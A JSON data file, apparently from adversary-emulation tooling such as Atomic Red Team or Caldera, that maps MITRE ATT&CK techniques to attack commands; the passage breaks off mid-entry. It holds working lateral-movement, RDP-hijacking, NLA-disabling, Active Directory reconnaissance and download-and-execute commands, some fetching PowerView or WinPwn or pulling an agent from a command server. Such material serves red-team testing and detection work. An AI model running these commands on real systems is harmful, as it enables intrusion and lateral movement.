{
   "T1254": [
      {
         "technique_id": "T1254",
         "technique_name": "Conduct active scanning",
         "tactic": "technical-information-gathering",
         "description": "Scan an external host for open ports and services",
         "command": "./scanner.sh #{target.ip}\n"
      }
   ],
   "T1349": [
      {
         "technique_id": "T1349",
         "technique_name": "Build or acquire exploits",
         "tactic": "build-capabilities",
         "description": "Load Metasploit Abilities",
         "command": "msfconsole -r msf_extract.rb #{app.contact.http} #{app.api_key.red}\n"
      }
   ],
   "T1021.001": [
      {
         "technique_id": "T1021.001",
         "technique_name": "Remote Services: Remote Desktop Protocol",
         "tactic": "lateral-movement",
         "description": "Changing RDP Port to Non Standard Port via Command_Prompt\n",
         "command": "reg add \"HKLM\\System\\CurrentControlSet\\Control\\Terminal Server\\WinStations\\RDP-Tcp\" /v PortNumber /t REG_DWORD /d 4489 /f && netsh advfirewall firewall add rule name=\"RDPPORTLatest-TCP-In\" dir=in action=allow protocol=TCP localport=4489"
      },
      {
         "technique_id": "T1021.001",
         "technique_name": "Remote Services: Remote Desktop Protocol",
         "tactic": "lateral-movement",
         "description": "Changing RDP Port to Non Standard Port via Powershell\n",
         "command": "Set-ItemProperty -Path 'HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\WinStations\\RDP-Tcp' -name \"PortNumber\" -Value 4489; New-NetFirewallRule -DisplayName 'RDPPORTLatest-TCP-In' -Profile 'Public' -Direction Inbound -Action Allow -Protocol TCP -LocalPort 4489"
      },
      {
         "technique_id": "T1021.001",
         "technique_name": "Remote Services: Remote Desktop Protocol",
         "tactic": "lateral-movement",
         "description": "Attempt an RDP session via Remote Desktop Application to a DomainController.\n",
         "command": "if((Get-CIMInstance -Class Win32_ComputerSystem) { ; } else {Write-Host Joining this computer to a domain must be done manually};  ;  $Server=#{logonserver}; $User = Join-Path; $Password=\"#{password}\"; cmdkey /generic:TERMSRV/$Server /user:$User /pass:$Password; mstsc /v:$Server; echo \"RDP connection established\""
      },
      {
         "technique_id": "T1021.001",
         "technique_name": "Remote Services: Remote Desktop Protocol",
         "tactic": "lateral-movement",
         "description": "Disables network-level authentication (NLA) for RDP by changing a registry key via Command Prompt\nDisabling NLA for RDP can allow remote user interaction with the Windows sign-in screen prior to authentication. According to Microsoft, Flax Typhoon actors used this technique implementation to achieve persistence on victim systems: https://www.microsoft.com/en-us/security/blog/2023/08/24/flax-typhoon-using-legitimate-software-to-quietly-access-taiwanese-organizations/\nSee also: https://github.com/EmpireProject/Empire/blob/master/lib/modules/powershell/management/enable_rdp.py\n",
         "command": "reg add \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\WinStations\\RDP-Tcp\" /v UserAuthentication /d 0 /t REG_DWORD /f"
      }
   ],
   "T1021.002": [
      {
         "technique_id": "T1021.002",
         "technique_name": "Remote Services: SMB/Windows Admin Shares",
         "tactic": "lateral-movement",
         "description": "Connecting To Remote Shares\n",
         "command": "cmd.exe /c \"net use \\\\Target\\C$ P@ssw0rd1 /u:DOMAIN\\Administrator\""
      },
      {
         "technique_id": "T1021.002",
         "technique_name": "Remote Services: SMB/Windows Admin Shares",
         "tactic": "lateral-movement",
         "description": "Map Admin share utilizing PowerShell\n",
         "command": "New-PSDrive -name g -psprovider filesystem -root \\\\Target\\C$"
      },
      {
         "technique_id": "T1021.002",
         "technique_name": "Remote Services: SMB/Windows Admin Shares",
         "tactic": "lateral-movement",
         "description": "Copies a file to a remote host and executes it using PsExec. Requires the download of PsExec from [https://docs.microsoft.com/en-us/sysinternals/downloads/psexec](https://docs.microsoft.com/en-us/sysinternals/downloads/psexec).\n",
         "command": "\"PathToAtomicsFolder\\..\\ExternalPayloads\\PsExec.exe\" \\\\localhost -accepteula -c C:\\Windows\\System32\\cmd.exe"
      },
      {
         "technique_id": "T1021.002",
         "technique_name": "Remote Services: SMB/Windows Admin Shares",
         "tactic": "lateral-movement",
         "description": "Executes a command, writing the output to a local Admin Share.\nThis technique is used by post-exploitation frameworks.\n",
         "command": "cmd.exe /Q /c hostname 1> \\\\127.0.0.1\\ADMIN$\\output.txt 2>&1"
      },
      {
         "technique_id": "T1021.002",
         "technique_name": "Remote Services: SMB/Windows Admin Shares",
         "tactic": "lateral-movement",
         "description": "Mounts a network file share on a target computer",
         "command": "net use \\\\#{remote.host.ip}\\c$ /user:#{domain.user.name} #{domain.user.password};\n"
      },
      {
         "technique_id": "T1021.002",
         "technique_name": "Remote Services: SMB/Windows Admin Shares",
         "tactic": "lateral-movement",
         "description": "Mount a windows share",
         "command": "net use \\\\#{remote.host.fqdn}\\C$ /user:#{domain.user.name} #{domain.user.password}\n"
      },
      {
         "technique_id": "T1021.002",
         "technique_name": "Remote Services: SMB/Windows Admin Shares",
         "tactic": "lateral-movement",
         "description": "Copy 54ndc47 to remote host (SMB)",
         "command": "$path = \"sandcat.go-windows\";\n$drive = \"\\\\#{remote.host.fqdn}\\C$\";\nCopy-Item -v -Path $path -Destination $drive\"\\Users\\Public\\s4ndc4t.exe\";\n"
      }
   ],
   "T1021.006": [
      {
         "technique_id": "T1021.006",
         "technique_name": "Remote Services: Windows Remote Management",
         "tactic": "lateral-movement",
         "description": "Powershell Enable WinRM\n\nUpon successful execution, powershell will \"Enable-PSRemoting\" allowing for remote PS access.\n",
         "command": "Enable-PSRemoting -Force"
      },
      {
         "technique_id": "T1021.006",
         "technique_name": "Remote Services: Windows Remote Management",
         "tactic": "lateral-movement",
         "description": "An adversary may attempt to use Evil-WinRM with a valid account to interact with remote systems that have WinRM enabled",
         "command": "evil-winrm -i Target -u Domain\\Administrator -p P@ssw0rd1"
      },
      {
         "technique_id": "T1021.006",
         "technique_name": "Remote Services: Windows Remote Management",
         "tactic": "lateral-movement",
         "description": "Simulate lateral movement with PowerShell Remoting on the local host. \nUpon successful execution, PowerShell will execute `whoami` using `Invoke-Command`, targeting the \nlocal machine as remote target.\n",
         "command": "Enable-PSRemoting -Force; Invoke-Command -ComputerName $env:COMPUTERNAME -ScriptBlock {whoami}"
      },
      {
         "technique_id": "T1021.006",
         "technique_name": "Remote Services: Windows Remote Management",
         "tactic": "lateral-movement",
         "description": "Start Agent using WinRM (WinRM)",
         "command": "$username = \"#{domain.user.name}\";\n$password = \"#{domain.user.password}\";\n$secstr = New-Object -TypeName System.Security.SecureString;\n$password.ToCharArray() | ForEach-Object {$secstr.AppendChar($_)};\n$cred = New-Object -Typename System.Management.Automation.PSCredential -Argumentlist $username, $secstr;\n$session = New-PSSession -ComputerName #{remote.host.name} -Credential $cred;\nInvoke-Command -Session $session -ScriptBlock{start-job -scriptblock{cmd.exe /c start C:\\Users\\Public\\svchost.exe -server #{server} }};\nStart-Sleep -s 5;\nRemove-PSSession -Session $session;\n"
      },
      {
         "technique_id": "T1021.006",
         "technique_name": "Remote Services: Windows Remote Management",
         "tactic": "lateral-movement",
         "description": "Copy Sandcat file using PowerShell",
         "command": "$server=\"#{server}\";\n$sharePath=\"#{share}\";\nSet-Location $sharePath;$url=\"$($server)/file/download\";\n$wc=New-Object System.Net.WebClient;$wc.Headers.add(\"platform\",\"windows\");\n$wc.Headers.add(\"file\",\"sandcat.go\");($data=$wc.DownloadData($url)) -and\n($name=$wc.ResponseHeaders[\"Content-Disposition\"].Substring($wc.ResponseHeaders[\"Content-Disposition\"].IndexOf(\"filename=\")+9).Replace(\"`\"\",\"\"))\n-and ([io.file]::WriteAllBytes(\"$($sharePath)$name.exe\",$data));\n$startServer=\"$($sharePath)$name.exe -server $($server) \";Invoke-Command\n-ScriptBlock {Param([string]$startServer, $sharePath, $name, $server)  Invoke-WmiMethod\n-Class Win32_Process -Name Create -ArgumentList \"$($sharePath)$name.exe\n-server $server -v\" } -ComputerName #{remote.host.name} -ArgumentList $startServer, $sharePath, $name, $server\n"
      }
   ],
   "T1563.002": [
      {
         "technique_id": "T1563.002",
         "technique_name": "Remote Service Session Hijacking: RDP Hijacking",
         "tactic": "lateral-movement",
         "description": "[RDP hijacking](https://medium.com/@networksecurity/rdp-hijacking-how-to-hijack-rds-and-remoteapp-sessions-transparently-to-move-through-an-da2a1e73a5f6) - how to hijack RDS and RemoteApp sessions transparently to move through an organization\n",
         "command": "query user && sc.exe create sesshijack binpath= \"cmd.exe /k tscon 1337 /dest:rdp-tcp#55\" && net start sesshijack"
      }
   ],
   "T1570": [
      {
         "technique_id": "T1570",
         "technique_name": "Lateral Tool Transfer",
         "tactic": "lateral-movement",
         "description": "Simulates an attacker exfiltrating data over SMB over QUIC using the New-SmbMapping command.\nPrerequisites:\n  - A file server running Windows Server 2022 Datacenter: Azure Edition\n  - A Windows 11 computer\n  - Windows Admin Center\n",
         "command": "New-SmbMapping -RemotePath '\\\\example.com\\sales' -TransportType QUIC -SkipCertificateCheck; copy 'C:\\path\\to\\file.txt' 'Z:\\'"
      },
      {
         "technique_id": "T1570",
         "technique_name": "Lateral Tool Transfer",
         "tactic": "lateral-movement",
         "description": "Simulates an attacker exfiltrating data over SMB over QUIC using the NET USE command.\nPrerequisites:\n  - A file server running Windows Server 2022 Datacenter: Azure Edition\n  - A Windows 11 computer\n  - Windows Admin Center\n",
         "command": "NET USE * '\\\\example.com\\sales' /TRANSPORT:QUIC /SKIPCERTCHECK; copy 'C:\\path\\to\\file.txt' '*:\\'"
      },
      {
         "technique_id": "T1570",
         "technique_name": "Lateral Tool Transfer",
         "tactic": "lateral-movement",
         "description": "Uses CertUtil as a LoL technique to move the .exe agent as a certificate using windows-signed binaries",
         "command": "certutil -encode #{location} C:\\users\\public\\com.crt | out-null;\ninvoke-command #{remote.host.fqdn} -scriptblock { certutil -decode \\\\#{local.host.fqdn}\\c$\\users\\public\\com.crt #{location}; invoke-wmimethod -computername . -class win32_process -name Create -argumentlist \"C:\\users\\public\\splunkd.exe -server #{server} -group red\" }\n"
      },
      {
         "technique_id": "T1570",
         "technique_name": "Lateral Tool Transfer",
         "tactic": "lateral-movement",
         "description": "Copy 54ndc47 to remote host (powershell 5 or newer only) or SCP",
         "command": "$job = Start-Job -ScriptBlock {\n  $username = \"#{domain.user.name}\";\n  $password = \"#{domain.user.password}\";\n  $secstr = New-Object -TypeName System.Security.SecureString;\n  $password.ToCharArray() | ForEach-Object {$secstr.AppendChar($_)};\n  $cred = New-Object -Typename System.Management.Automation.PSCredential -Argumentlist $username, $secstr;\n  $session = New-PSSession -ComputerName \"#{remote.host.name}\" -Credential $cred;\n  $location = \"#{location}\";\n  $exe = \"#{exe_name}\";\n  Copy-Item $location -Destination \"C:\\Users\\Public\\svchost.exe\" -ToSession $session;\n  Start-Sleep -s 5;\n  Remove-PSSession -Session $session;\n};\nReceive-Job -Job $job -Wait;\n"
      },
      {
         "technique_id": "T1570",
         "technique_name": "Lateral Tool Transfer",
         "tactic": "lateral-movement",
         "description": "Copy Sandcat file using PsExec on CMD",
         "command": "net /y use \\\\#{remote.host.name} & copy /y sandcat.go-windows\n\\\\#{remote.host.name}\\Users\\Public & #{psexec.path} -accepteula \\\\#{remote.host.name}\ncmd /c start C:\\Users\\Public\\sandcat.go-windows -server #{server} -v\n"
      }
   ],
   "T1021.005": [
      {
         "technique_id": "T1021.005",
         "technique_name": "Remote Services:VNC",
         "tactic": "lateral-movement",
         "description": "ARD leverages a blend of protocols, including VNC to send the screen and control buffers and SSH for secure file transfer. \nAdversaries can abuse ARD to gain remote code execution and perform lateral movement.\n\nReferences:  https://www.mandiant.com/resources/blog/leveraging-apple-remote-desktop-for-good-and-evil\n",
         "command": "sudo /System/Library/CoreServices/RemoteManagement/ARDAgent.app/Contents/Resources/kickstart -activate -configure -allowAccessFor -allUsers -privs -all -quiet"
      }
   ],
   "T1021.003": [
      {
         "technique_id": "T1021.003",
         "technique_name": "Remote Services: Distributed Component Object Model",
         "tactic": "lateral-movement",
         "description": "Powershell lateral movement using the mmc20 application com object.\n\nReference:\n\nhttps://blog.cobaltstrike.com/2017/01/24/scripting-matt-nelsons-mmc20-application-lateral-movement-technique/\n\nUpon successful execution, cmd will spawn calc.exe on a remote computer.\n",
         "command": "[activator]::CreateInstance([type]::GetTypeFromProgID(\"MMC20.application\",\"localhost\")).Document.ActiveView.ExecuteShellCommand(\"c:\\windows\\system32\\calc.exe\", $null, $null, \"7\")"
      }
   ],
   "T1012": [
      {
         "technique_id": "T1012",
         "technique_name": "Query Registry",
         "tactic": "discovery",
         "description": "Query Windows Registry.\nUpon successful execution, cmd.exe will perform multiple reg queries. Some will succeed and others will fail (dependent upon OS).\nReferences:\nhttps://blog.cylance.com/windows-registry-persistence-part-2-the-run-keys-and-search-order\nhttps://blog.cylance.com/windows-registry-persistence-part-1-introduction-attack-phases-and-windows-services\nhttp://www.handgrep.se/repository/cheatsheets/postexploitation/WindowsPost-Exploitation.pdf\nhttps://www.offensive-security.com/wp-content/uploads/2015/04/wp.Registry_Quick_Find_Chart.en_us.pdf\n",
         "command": "reg query \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Windows\" && reg query HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServicesOnce && reg query HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServicesOnce && reg query HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServices && reg query HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServices && reg query \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\Notify\" && reg query \"HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\Userinit\" && reg query \"HKCU\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\\\Shell\" && reg query \"HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\\\Shell\" && reg query HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\ShellServiceObjectDelayLoad && reg query HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce && reg query HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnceEx && reg query HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run && reg query HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run && reg query HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce && reg query HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run && reg query HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run && reg query HKLM\\system\\currentcontrolset\\services /s | findstr ImagePath 2>nul | findstr /Ri \".*\\.sys$\" && reg query HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run && reg query HKLM\\SYSTEM\\CurrentControlSet\\Control\\SafeBoot && reg query \"HKLM\\SOFTWARE\\Microsoft\\Active Setup\\Installed Components\" && reg query \"HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Group Policy\\Scripts\\Startup\""
      },
      {
         "technique_id": "T1012",
         "technique_name": "Query Registry",
         "tactic": "discovery",
         "description": "Query Windows Registry with Powershell cmdlets, i.e., Get-Item and Get-ChildItem. The results from above can also be achieved with Get-Item and Get-ChildItem.\nUnlike using \"reg query\" which then executes reg.exe, using cmdlets won't generate new processes, which may evade detection systems monitoring process generation. \n",
         "command": "Get-Item -Path \"HKLM:SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Windows\"; Get-ChildItem -Path \"HKLM:SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\\" | findstr Windows; Get-Item -Path \"HKLM:Software\\Microsoft\\Windows\\CurrentVersion\\RunServicesOnce\"; Get-Item -Path \"HKCU:Software\\Microsoft\\Windows\\CurrentVersion\\RunServicesOnce\"; Get-Item -Path \"HKLM:Software\\Microsoft\\Windows\\CurrentVersion\\RunServices\"; Get-Item -Path \"HKCU:Software\\Microsoft\\Windows\\CurrentVersion\\RunServices\"; Get-Item -Path \"HKLM:SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\Notify\"; Get-Item -Path \"HKLM:Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\Userinit\"; Get-Item -Path \"HKCU:Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\\\Shell\"; Get-Item -Path \"HKLM:Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\\\Shell\"; Get-Item -Path \"HKLM:SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\ShellServiceObjectDelayLoad\"; Get-Item -Path \"HKLM:Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce\"; Get-Item -Path \"HKLM:Software\\Microsoft\\Windows\\CurrentVersion\\RunOnceEx\"; Get-Item -Path \"HKLM:Software\\Microsoft\\Windows\\CurrentVersion\\Run\"; Get-Item -Path \"HKCU:Software\\Microsoft\\Windows\\CurrentVersion\\Run\"; Get-Item -Path \"HKCU:Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce\"; Get-Item -Path \"HKLM:Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run\"; Get-Item -Path \"HKCU:Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run\"; Get-ChildItem -Path \"HKLM:system\\currentcontrolset\\services\" ; Get-Item -Path \"HKLM:Software\\Microsoft\\Windows\\CurrentVersion\\Run\"; Get-Item -Path \"HKLM:SYSTEM\\CurrentControlSet\\Control\\SafeBoot\"; Get-ChildItem -Path \"HKLM:SOFTWARE\\Microsoft\\Active Setup\\Installed Components\"; Get-ChildItem -Path \"HKLM:SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Group Policy\\Scripts\\Startup\""
      },
      {
         "technique_id": "T1012",
         "technique_name": "Query Registry",
         "tactic": "discovery",
         "description": "This test is designed to enumerate the COM objects listed in HKCR, then output their methods and CLSIDs to a text file.\nAn adversary could then use this information to identify COM objects that might be vulnerable to abuse, such as using them to spawn arbitrary processes. \nSee: https://www.mandiant.com/resources/hunting-com-objects",
         "command": "New-PSDrive -PSProvider registry -Root HKEY_CLASSES_ROOT -Name HKCR; Get-ChildItem -Path HKCR:\\CLSID -Name | Select -Skip 1 > $env:temp\\clsids.txt; ForEach($CLSID in Get-Content \"$env:temp\\clsids.txt\"); {try{write-output \"$($Position)-$($CLSID)\"; write-output \"------------\"| out-file $env:temp\\T1592.002Test1.txt -append; write-output $($CLSID)| out-file $env:temp\\T1592.002Test1.txt -append; $handle=[activator]::CreateInstance([type]::GetTypeFromCLSID($CLSID)); $handle | get-member -erroraction silentlycontinue | out-file $env:temp\\T1592.002Test1.txt -append; $position += 1} catch{}}"
      },
      {
         "technique_id": "T1012",
         "technique_name": "Query Registry",
         "tactic": "discovery",
         "description": "Query Registry using PowerShell Get-ItemProperty",
         "command": "Get-ItemProperty -Path HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\n"
      }
   ],
   "T1087.002": [
      {
         "technique_id": "T1087.002",
         "technique_name": "Account Discovery: Domain Account",
         "tactic": "discovery",
         "description": "Utilizing PowerView, run Get-DomainUser to identify the domain users. Upon execution, Users within the domain will be listed.\n",
         "command": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; IEX (IWR 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1' -UseBasicParsing); Get-DomainUser -verbose"
      },
      {
         "technique_id": "T1087.002",
         "technique_name": "Account Discovery: Domain Account",
         "tactic": "discovery",
         "description": "Enumerate all accounts via PowerShell. Upon execution, lots of user account and group information will be displayed.\n",
         "command": "net user /domain; get-localgroupmember -group Users; get-aduser -filter *"
      },
      {
         "technique_id": "T1087.002",
         "technique_name": "Account Discovery: Domain Account",
         "tactic": "discovery",
         "description": "Enumerate logged on users. Upon exeuction, logged on users will be displayed.\n",
         "command": "query user /SERVER:%COMPUTERNAME%"
      },
      {
         "technique_id": "T1087.002",
         "technique_name": "Account Discovery: Domain Account",
         "tactic": "discovery",
         "description": "This test will enumerate the details of the built-in domain admin account\n",
         "command": "net user administrator /domain"
      },
      {
         "technique_id": "T1087.002",
         "technique_name": "Account Discovery: Domain Account",
         "tactic": "discovery",
         "description": "The following Atomic test will utilize ADSISearcher to enumerate root domain unit within Active Directory.\nUpon successful execution a listing of users will output with their paths in AD.\nReference: https://medium.com/@pentesttas/discover-hidden-gpo-s-on-active-directory-using-ps-adsi-a284b6814c81\n",
         "command": "(([adsisearcher]'').SearchRooT).Path | %{if(([ADSI]\"$_\").gPlink){Write-Host \"[+] Domain Path:\"([ADSI]\"$_\").Path;$a=((([ADSI]\"$_\").gplink) -replace \"[[;]\" -split \"]\");for($i=0;$i -lt $a.length;$i++){if($a[$i]){Write-Host \"Policy Path[$i]:\"([ADSI]($a[$i]).Substring(0,$a[$i].length-1)).Path;Write-Host \"Policy Name[$i]:\"([ADSI]($a[$i]).Substring(0,$a[$i].length-1)).DisplayName} };Write-Output \"`n\" }}"
      },
      {
         "technique_id": "T1087.002",
         "technique_name": "Account Discovery: Domain Account",
         "tactic": "discovery",
         "description": "ADRecon extracts and combines information about an AD environement into a report. Upon execution, an Excel file with all of the data will be generated and its\npath will be displayed.\n",
         "command": "Invoke-Expression \"C:\\Users\\puma-4\\Desktop\\ADRecon.ps1\""
      },
      {
         "technique_id": "T1087.002",
         "technique_name": "Account Discovery: Domain Account",
         "tactic": "discovery",
         "description": "Output information from LDAPSearch. LDAP Password is the admin-user password on Active Directory\n",
         "command": "ldapsearch -H ldap://example.test:389 -x -D user@example.test -w s3CurePssw0rD! -b \"CN=Users,DC=example,DC=test\" -s sub -a always -z 1000 dn"
      },
      {
         "technique_id": "T1087.002",
         "technique_name": "Account Discovery: Domain Account",
         "tactic": "discovery",
         "description": "Attackers may attempt to query for computer objects with the UserAccountControl property\n'TRUSTED_FOR_DELEGATION' (0x80000;524288) set\nMore Information - https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html#when-the-stars-align-unconstrained-delegation-leads-to-rce\nPrerequisite: AD RSAT PowerShell module is needed and it must run under a domain user\n",
         "command": "Try {;     Import-Module ActiveDirectory -ErrorAction Stop | Out-Null;      ; }; Catch {;     if((Get-CimInstance -ClassName Win32_OperatingSystem).ProductType -eq 1) {;   Add-WindowsCapability -Name (Get-WindowsCapability -Name RSAT.ActiveDirectory.DS* -Online).Name -Online; } else {;   Install-WindowsFeature RSAT-AD-PowerShell; }; };  ;  Get-ADObject -LDAPFilter '(UserAccountControl:1.2.840.113556.1.4.803:=524288)' -Server $env:UserDnsDomain"
      },
      {
         "technique_id": "T1087.002",
         "technique_name": "Account Discovery: Domain Account",
         "tactic": "discovery",
         "description": "The following Atomic test will utilize ADSISearcher to enumerate users within Active Directory.\nUpon successful execution a listing of users will output with their paths in AD.\nReference: https://devblogs.microsoft.com/scripting/use-the-powershell-adsisearcher-type-accelerator-to-search-active-directory/\n",
         "command": "([adsisearcher]\"objectcategory=user\").FindAll(); ([adsisearcher]\"objectcategory=user\").FindOne()"
      },
      {
         "technique_id": "T1087.002",
         "technique_name": "Account Discovery: Domain Account",
         "tactic": "discovery",
         "description": "The following Atomic test will utilize ADSISearcher to enumerate organizational unit within Active Directory.\nUpon successful execution a listing of users will output with their paths in AD.\nReference: https://medium.com/@pentesttas/discover-hidden-gpo-s-on-active-directory-using-ps-adsi-a284b6814c81\n",
         "command": "(([adsisearcher]'(objectcategory=organizationalunit)').FindAll()).Path | %{if(([ADSI]\"$_\").gPlink){Write-Host \"[+] OU Path:\"([ADSI]\"$_\").Path;$a=((([ADSI]\"$_\").gplink) -replace \"[[;]\" -split \"]\");for($i=0;$i -lt $a.length;$i++){if($a[$i]){Write-Host \"Policy Path[$i]:\"([ADSI]($a[$i]).Substring(0,$a[$i].length-1)).Path;Write-Host \"Policy Name[$i]:\"([ADSI]($a[$i]).Substring(0,$a[$i].length-1)).DisplayName} };Write-Output \"`n\" }}"
      },
      {
         "technique_id": "T1087.002",
         "technique_name": "Account Discovery: Domain Account",
         "tactic": "discovery",
         "description": "This test discovers users who have authenticated against a Domain Controller via NTLM. \nThis is done remotely via wmic and captures the event code 4776 from the domain controller and stores the ouput in C:\\temp. [Reference](https://www.reliaquest.com/blog/socgholish-fakeupdates/)\n",
         "command": "$target = $env:LOGONSERVER; $target = $target.Trim(\"\\\\\"); $IpAddress = [System.Net.Dns]::GetHostAddresses($target) | select IPAddressToString -ExpandProperty IPAddressToString; wmic.exe /node:$IpAddress process call create 'wevtutil epl Security C:\\\\ntlmusers.evtx /q:\\\"Event[System[(EventID=4776)]]\"'"
      },
      {
         "technique_id": "T1087.002",
         "technique_name": "Account Discovery: Domain Account",
         "tactic": "discovery",
         "description": "Gathers general domain information using the generaldomaininfo function of WinPwn",
         "command": "$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'; iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1'); generaldomaininfo -noninteractive -consoleoutput"
      },
      {
         "technique_id": "T1087.002",
         "technique_name": "Account Discovery: Domain Account",
         "tactic": "discovery",
         "description": "Adfind tool can be used for reconnaissance in an Active directory environment. The example chosen illustrates adfind used to query the local password policy.\nreference- http://www.joeware.net/freetools/tools/adfind/, https://social.technet.microsoft.com/wiki/contents/articles/7535.adfind-command-examples.aspx\n",
         "command": "\"PathToAtomicsFolder\\..\\ExternalPayloads\\AdFind.exe\" -default -s base lockoutduration lockoutthreshold lockoutobservationwindow maxpwdage minpwdage minpwdlength pwdhistorylength pwdproperties"
      },
      {
         "technique_id": "T1087.002",
         "technique_name": "Account Discovery: Domain Account",
         "tactic": "discovery",
         "description": "Enumerates active directory usernames using the userenum function of Kerbrute",
         "command": "C:\\Users\\puma-4\\Desktop\\kerbrute_windows_386.exe userenum -d $env:USERDOMAIN --dc $env:UserDnsDomain \"C:\\Users\\puma-4\\Desktop\\username.txt\""
      },
      {
         "technique_id": "T1087.002",
         "technique_name": "Account Discovery: Domain Account",
         "tactic": "discovery",
         "description": "Adfind tool can be used for reconnaissance in an Active directory environment. This example has been documented by ransomware actors enumerating Active Directory Exchange Objects\nreference- http://www.joeware.net/freetools/tools/adfind/, https://www.fireeye.com/blog/threat-research/2019/04/pick-six-intercepting-a-fin6-intrusion.html\n",
         "command": "\"PathToAtomicsFolder\\..\\ExternalPayloads\\AdFind.exe\" -sc exchaddresses"
      },
      {
         "technique_id": "T1087.002",
         "technique_name": "Account Discovery: Domain Account",
         "tactic": "discovery",
         "description": "Adfind tool can be used for reconnaissance in an Active directory environment. This example has been documented by ransomware actors enumerating Active Directory Admin accounts\nreference- http://www.joeware.net/freetools/tools/adfind/, https://stealthbits.com/blog/fun-with-active-directorys-admincount-attribute/\n",
         "command": "\"PathToAtomicsFolder\\..\\ExternalPayloads\\AdFind.exe\" -sc admincountdmp"
      },
      {
         "technique_id": "T1087.002",
         "technique_name": "Account Discovery: Domain Account",
         "tactic": "discovery",
         "description": "Adfind tool can be used for reconnaissance in an Active directory environment. This example has been documented by ransomware actors enumerating Active Directory User Objects\nreference- http://www.joeware.net/freetools/tools/adfind/, https://www.fireeye.com/blog/threat-research/2019/04/pick-six-intercepting-a-fin6-intrusion.html\n",
         "command": "\"PathToAtomicsFolder\\..\\ExternalPayloads\\AdFind.exe\" -f (objectcategory=person)"
      },
      {
         "technique_id": "T1087.002",
         "technique_name": "Account Discovery: Domain Account",
         "tactic": "discovery",
         "description": "Enumerate all accounts\nUpon exection, multiple enumeration commands will be run and their output displayed in the PowerShell session\n",
         "command": "net user /domain && net group /domain"
      },
      {
         "technique_id": "T1087.002",
         "technique_name": "Account Discovery: Domain Account",
         "tactic": "discovery",
         "description": "The net utility is executed via cmd to enumerate domain user accounts.",
         "command": "net user /domain"
      },
      {
         "technique_id": "T1087.002",
         "technique_name": "Account Discovery: Domain Account",
         "tactic": "discovery",
         "description": "The net utility is executed via cmd to enumerate detailed information about a specific user account.",
         "command": "net user #{domain.user.name} /domain"
      }
   ],
   "T1016": [
      {
         "technique_id": "T1016",
         "technique_name": "System Network Configuration Discovery",
         "tactic": "discovery",
         "description": "A list of commands known to be performed by Qakbot for recon purposes",
         "command": "\"64c4ae_qakbot.bat\""
      },
      {
         "technique_id": "T1016",
         "technique_name": "System Network Configuration Discovery",
         "tactic": "discovery",
         "description": "This is to test for what ports are open outbound.  The technique used was taken from the following blog:\nhttps://www.blackhillsinfosec.com/poking-holes-in-the-firewall-egress-testing-with-allports-exposed/\n\nUpon successful execution, powershell will read top-128.txt (ports) and contact each port to confirm if open or not. Output will be to Desktop\\open-ports.txt.\n",
         "command": "$ports = Get-content \"88a14d_top-128.txt\"; $file = \"$env:USERPROFILE\\Desktop\\open-ports.txt\"; $totalopen = 0; $totalports = 0; New-Item $file -Force; foreach ($port in $ports) {;     $test = new-object system.Net.Sockets.TcpClient;     $wait = $test.beginConnect(\"allports.exposed\", $port, $null, $null);     $wait.asyncwaithandle.waitone(250, $false) | Out-Null;     $totalports++ | Out-Null;     if ($test.Connected) {;         $result = \"$port open\" ;         Write-Host -ForegroundColor Green $result;         $result | Out-File -Encoding ASCII -append $file;         $totalopen++ | Out-Null;     };     else {;         $result = \"$port closed\" ;         Write-Host -ForegroundColor Red $result;         $totalclosed++ | Out-Null;         $result | Out-File -Encoding ASCII -append $file;     }; }; $results = \"There were a total of $totalopen open ports out of $totalports ports tested.\"; $results | Out-File -Encoding ASCII -append $file; Write-Host $results"
      },
      {
         "technique_id": "T1016",
         "technique_name": "System Network Configuration Discovery",
         "tactic": "discovery",
